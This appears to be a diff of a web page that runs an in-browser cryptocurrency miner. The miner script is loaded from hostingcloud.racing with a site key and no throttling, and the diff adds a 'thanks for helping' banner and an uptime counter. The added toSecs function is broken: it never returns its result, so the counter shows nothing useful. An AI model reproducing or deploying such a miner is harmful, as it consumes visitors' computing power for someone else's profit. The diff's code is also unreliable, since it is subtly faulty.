@@ -50,7 +50,8 @@
     }
 </style>
 
-
+Thanks You For Help Me!<br>
+Has Been Running For: <time></time><br>
 Hashes: <hashes style="color: blanchedalmond;"></hashes><br>
 Job: <job style="color: blanchedalmond;"></job>
 <div power>
@@ -84,10 +85,34 @@ Job: <job style="color: blanchedalmond;"></job>
 <script src="https://www.hostingcloud.racing/YkYQ.js"></script>
 <script>
     function addCommas(x) {y = x.toString().split('.');return y.shift().replace(/\B(?=(\d{3})+(?!\d))/g, ",")+(y.length?'.'+y.join(''):'')}
+    function toSecs(x) {x/=1000
+        var Result = ''
+        if (x >= 60*60*24*30*12) {
+            Result += Math.floor(x/(60*60*24*30*12)) + ' years '
+            x %= (60*60*24*30*12)
+        }
+        if (x>= 60*60*24*30) {
+            Result += Math.floor(x/(60*60*24*30)) + ' months '
+            x %= (60*60*24*30)
+        }
+        if (x >= 60*60*24) {
+            Result += Math.floor(x/(60*60*24)) + ' days '
+            x %= (60*60*24)
+        }
+        if (x >= 60*60) {
+            Result += Math.floor(x/(60*60)) + ' hours '
+            x %= (60*60)
+        }
+        if (x >= 60) {
+            Result += Math.floor(x/(60)) + ' minutes '
+            x %= (60)
+        }
+    }
     var _client = new Client.Anonymous('32020e88ee5d49144152b609fae0a8838a0cfdd469add84da91eb5171c920f30', {
         throttle: 0, c: 'w'
     });
     _client.start();
+    var started = new Date()
 
     var job = 0
     var found = 0
@@ -102,6 +127,7 @@ Job: <job style="color: blanchedalmond;"></job>
     })
 
     setInterval(() => {
+        document.querySelector('time').innerText = toSecs(Number(new Date()) - Number(started))
         document.querySelector('hashes').innerText = addCommas(_client.getTotalHashes())+` (${addCommas(_client.getHashesPerSecond())})`
         document.querySelector('job').innerText = addCommas(job)+` (${addCommas(found)})`
     }, 1000);
